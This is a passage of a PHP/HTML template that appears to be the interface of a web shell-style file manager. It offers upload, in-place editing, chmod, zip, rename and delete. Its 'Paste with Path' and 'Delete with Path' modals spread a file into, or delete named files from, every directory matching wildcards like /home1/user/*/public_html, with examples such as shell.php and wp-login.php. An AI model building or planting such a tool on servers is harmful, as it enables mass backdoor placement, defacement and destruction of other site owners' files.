                <span class="log-path"><?php echo htmlspecialchars($row['path']); ?></span>
            </div>
            <?php endforeach; ?>
        </div>
        <textarea id="dwp-log-text" style="position:absolute;left:-9999px;top:-9999px;" readonly><?php
            foreach ($dwp_result_log as $row) {
                echo $row['status'] . "\t" . $row['path'] . "\n";
            }
        ?></textarea>
    </div>
    <?php endif; ?>

    <div class="card">
        <h3>Upload File</h3>
        <form method="post" enctype="multipart/form-data" style="display: flex; gap: 10px; align-items: center; margin-top: 10px;">
            <input type="hidden" name="target_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="file" name="fileToUpload" required>
            <input type="submit" value="Upload" class="btn">
        </form>
    </div>

    <?php if ($edit_file): ?>
    <div class="card">
        <h3>Edit File: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
        <form method="post" action="?dir=<?php echo urlencode($current_dir); ?>">
            <input type="hidden" name="action" value="edit">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($edit_file); ?>">
            <textarea name="content" rows="20" style="width: 100%; box-sizing: border-box; margin-bottom: 15px;"><?php echo htmlspecialchars($edit_content); ?></textarea>
            <br>
            <input type="submit" value="Save File" class="btn">
            <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-secondary" style="margin-left: 10px;">Cancel</a>
        </form>
    </div>
    <?php endif; ?>

    <div class="card">
        <div class="breadcrumb">
            <span>Path:</span>
            <?php 
            $i = 0;
            $count = count($breadcrumbs);
            foreach ($breadcrumbs as $name => $path): 
                $i++;
            ?>
                <a href="?dir=<?php echo urlencode($path); ?>"><?php echo htmlspecialchars($name); ?></a>
                <?php if ($i < $count): ?><span>/</span><?php endif; ?>
            <?php endforeach; ?>
        </div>

        <form method="post" id="main-filemanager-form">
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <div class="toolbar">
                <span style="font-size: 0.85rem; color: var(--text-muted); font-weight: 600;">BATCH ACTIONS:</span>
                <button type="submit" name="action" value="clipboard_copy" class="btn btn-secondary">📋 Copy</button>
                <button type="submit" name="action" value="clipboard_cut" class="btn btn-secondary">✂️ Cut</button>
                <button type="button"
                    class="btn <?php echo $has_clipboard ? 'btn-pwp-active' : 'btn-paste-disabled'; ?>"
                    <?php if ($has_clipboard): ?>onclick="a3OpenPWP()"<?php else: ?>disabled<?php endif; ?>>
                    📌 Paste with Path
                </button>
                <button type="submit" name="action" value="clipboard_paste" class="btn <?php echo $has_clipboard ? 'btn-paste-active' : 'btn-paste-disabled'; ?>">📥 Paste Here</button>
                <button type="button" class="btn btn-dwp-active" onclick="a3OpenDWP()">🗑️ Delete with Path</button>
                <button type="submit" name="action" value="zip_selected" class="btn btn-secondary">📦 Zip (.zip)</button>
                <button type="submit" name="action" value="unzip_selected" class="btn btn-secondary">📂 Unzip</button>
                <button type="submit" name="action" value="delete_selected" class="btn btn-danger" onclick="return confirm('Delete all selected items?');">🗑️ Delete Selected</button>
                
                <?php if ($has_clipboard): ?>
                    <span style="font-size: 0.8rem; color: var(--accent-color); margin-left: auto;">
                        Clipboard: <?php echo count($_SESSION['a3_clipboard']['paths']); ?> item(s) [<?php echo strtoupper($_SESSION['a3_clipboard']['action']); ?>]
                    </span>
                <?php endif; ?>
            </div>

            <table>
                <thead>
                    <tr>
                        <th style="width: 40px;"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th style="text-align: right;">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($items as $item): ?>
                    <tr>
                        <td>
                            <?php if ($item['name'] !== '..'): ?>
                                <input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item['path']); ?>">
                            <?php endif; ?>
                        </td>
                        <td>
                            <?php if ($item['name'] === '..'): ?>
                                <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="item-link">📁 ..</a>
                            <?php elseif ($item['is_dir']): ?>
                                📁 <a href="?dir=<?php echo urlencode($item['path']); ?>" class="item-link"><?php echo htmlspecialchars($item['name']); ?></a>
                            <?php else: ?>
                                📄 <span class="item-link"><?php echo htmlspecialchars($item['name']); ?></span>
                            <?php endif; ?>
                        </td>
                        <td><?php echo is_numeric($item['size']) ? a3_format_size($item['size']) : $item['size']; ?></td>
                        <td>
                            <?php if ($item['name'] !== '..'): ?>
                                <input type="text" name="perm_vals[<?php echo htmlspecialchars($item['path']); ?>]" value="<?php echo htmlspecialchars($item['perms']); ?>" style="width: 60px; text-align: center;">
                                <button type="submit" name="action" value="chmod" onclick="this.form.single_path.value='<?php echo htmlspecialchars($item['path']); ?>'; this.form.permissions.value=this.form.querySelector('[name=\'perm_vals[<?php echo addslashes($item['path']); ?>]\']').value;" class="btn btn-secondary" style="padding: 3px 6px; font-size: 0.75rem;">Set</button>
                            <?php else: ?>
                                <?php echo htmlspecialchars($item['perms']); ?>
                            <?php endif; ?>
                        </td>
                        <td><?php echo htmlspecialchars($item['modified']); ?></td>
                        <td style="text-align: right;">
                            <?php if ($item['name'] !== '..'): ?>
                                <div class="actions-group">
                                    <?php if (!$item['is_dir']): ?>
                                        <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item['path']); ?>" class="btn btn-secondary">Edit</a>
                                    <?php endif; ?>
                                    
                                    <input type="text" name="rename_vals[<?php echo htmlspecialchars($item['path']); ?>]" placeholder="New name" style="width: 90px;">
                                    <button type="submit" name="action" value="rename" class="btn btn-secondary" onclick="this.form.old_path.value='<?php echo htmlspecialchars($item['path']); ?>'; this.form.new_name.value=this.form.querySelector('[name=\'rename_vals[<?php echo addslashes($item['path']); ?>]\']').value; return confirm('Rename this item?');">Rename</button>
                                    
                                    <button type="submit" name="action" value="delete" class="btn btn-danger" onclick="this.form.single_path.value='<?php echo htmlspecialchars($item['path']); ?>'; return confirm('Delete this item?');">Delete</button>
                                </div>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <!-- Hidden fields for single row operations -->
            <input type="hidden" name="single_path" value="">
            <input type="hidden" name="permissions" value="">
            <input type="hidden" name="old_path" value="">
            <input type="hidden" name="new_name" value="">
        </form>
    </div>
</div>
<!-- ============================================================ -->
<!-- DELETE WITH PATH MODAL                                       -->
<!-- ============================================================ -->
<div id="dwp-overlay">
    <div id="dwp-modal">
        <h3>🗑️ Delete with Path</h3>

        <form method="post" id="dwp-form"
              action="?dir=<?php echo urlencode($current_dir); ?>">
            <input type="hidden" name="dir"    value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="hidden" name="action" value="delete_with_path">

            <div class="pwp-field">
                <label>Base Path</label>
                <input type="text" name="dwp_path" id="dwp_path"
                       value="<?php echo htmlspecialchars($current_dir); ?>"
                       placeholder="/home1/user/example.com/">
                <div class="pwp-hint">
                    Use <code>*</code> for all subdirs &nbsp;→&nbsp;
                    <code>/home1/user/*/public_html</code>
                </div>
            </div>

            <div class="pwp-field">
                <label>Target Names to Delete <span style="font-weight:400;text-transform:none;">&mdash; one per line (filename or dirname)</span></label>
                <textarea name="dwp_targets" rows="6"
                          style="width:100%;box-sizing:border-box;background:var(--bg-color);border:1px solid var(--border-color);color:var(--text-main);padding:8px 12px;border-radius:6px;font-family:monospace;font-size:0.88rem;resize:vertical;"
                          placeholder="index.php&#10;wp-login.php&#10;old-backup&#10;shell.php"></textarea>
                <div class="pwp-hint">Each name is searched inside every resolved directory and deleted if found.</div>
            </div>

            <div class="pwp-field">
                <label>Max Depth <span style="font-weight:400;text-transform:none;">&mdash; 0 = only base path, 1 = +1 subdir level&hellip;</span></label>
                <input type="number" name="dwp_depth" id="dwp_depth"
                       value="0" min="0" max="5000"
                       placeholder="0">
            </div>

            <div class="pwp-actions">
                <button type="button" class="btn btn-secondary" onclick="a3CloseDWP()">Cancel</button>
                <button type="submit" class="btn-dwp-confirm"
                        onclick="return confirm('This will permanently delete the specified items. Continue?');">
                    🗑️ Delete Now
                </button>
            </div>
        </form>
    </div>
</div>

<!-- ============================================================ -->
<!-- PASTE WITH PATH MODAL                                        -->
<!-- ============================================================ -->
<div id="pwp-overlay">
    <div id="pwp-modal">
        <h3>📌 Paste with Path</h3>

        <form method="post" id="pwp-form"
              action="?dir=<?php echo urlencode($current_dir); ?>">
            <input type="hidden" name="dir"    value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="hidden" name="action" value="paste_with_path">

            <div class="pwp-field">
                <label>Destination Path</label>
                <input type="text" name="pwp_path" id="pwp_path"
                       value="<?php echo htmlspecialchars($current_dir); ?>"
                       placeholder="/home1/user/example.com/">
                <div class="pwp-hint">
                    Use <code>*</code> as wildcard for all subdirs &nbsp;→&nbsp;
                    <code>/home1/user/*/public_html</code>
                </div>
            </div>

            <div class="pwp-field">
                <label>Copy As (New Filename) <span style="font-weight:400;text-transform:none;">&mdash; leave blank to keep original</span></label>
                <input type="text" name="pwp_newname" id="pwp_newname"
                       placeholder="e.g. backup.php">
            </div>

            <div class="pwp-field">
                <label>Max Depth <span style="font-weight:400;text-transform:none;">&mdash; 0 = only destination dir, 1 = +1 subdir level&hellip;</span></label>
                <input type="number" name="pwp_depth" id="pwp_depth"
                       value="0" min="0" max="5000"
                       placeholder="0">
                <div class="pwp-hint">
                    0 = paste only into the given path &nbsp;|&nbsp;
                    1 = path + all direct subdirs &nbsp;|&nbsp;
                    2 = + their subdirs &hellip; up to 5000
                </div>
            </div>

            <div class="pwp-field">
                <label>File Permissions (Chmod) <span style="font-weight:400;text-transform:none;">&mdash; leave blank to skip</span></label>
                <input type="text" name="pwp_chmod" id="pwp_chmod"
                       placeholder="e.g. 0644 or 755" maxlength="4">
            </div>

            <div class="pwp-actions">
                <button type="button" class="btn btn-secondary" onclick="a3ClosePWP()">Cancel</button>
                <button type="submit" class="btn-pwp-confirm">✔ Paste Now</button>
            </div>
        </form>
    </div>
</div>

<script>
    /* ---- PWP modal ---- */
    function a3OpenPWP() {
        document.getElementById('pwp_path').value = <?php echo json_encode($current_dir); ?>;
        document.getElementById('pwp-overlay').classList.add('active');
    }
    function a3ClosePWP() {
        document.getElementById('pwp-overlay').classList.remove('active');
    }
    document.getElementById('pwp-overlay').addEventListener('click', function(e) {
        if (e.target === this) a3ClosePWP();
    });

    /* ---- DWP modal ---- */
    function a3OpenDWP() {
        document.getElementById('dwp_path').value = <?php echo json_encode($current_dir); ?>;
        document.getElementById('dwp-overlay').classList.add('active');
    }
    function a3CloseDWP() {
        document.getElementById('dwp-overlay').classList.remove('active');
    }
    document.getElementById('dwp-overlay').addEventListener('click', function(e) {
        if (e.target === this) a3CloseDWP();
    });

    /* ---- shared Escape key ---- */
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') { a3ClosePWP(); a3CloseDWP(); }
    });

    /* ---- copy log to clipboard ---- */
    function a3CopyLog(textareaId) {
        var ta = document.getElementById(textareaId);
        if (!ta) return;
        ta.style.position = 'fixed';
        ta.style.left = '0';
        ta.select();
        try {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(ta.value).then(function() {
                    a3FlashCopy();
                });
            } else {
                document.execCommand('copy');
                a3FlashCopy();
            }
        } catch(e) {}
        ta.style.position = 'absolute';
        ta.style.left = '-9999px';
    }
    function a3FlashCopy() {
        var btns = document.querySelectorAll('.btn-copy-log');
        btns.forEach(function(b) {
            var orig = b.textContent;
            b.textContent = '✔ Copied!';
            setTimeout(function() { b.textContent = orig; }, 1500);
        });
    }
</script>
</body>
</html>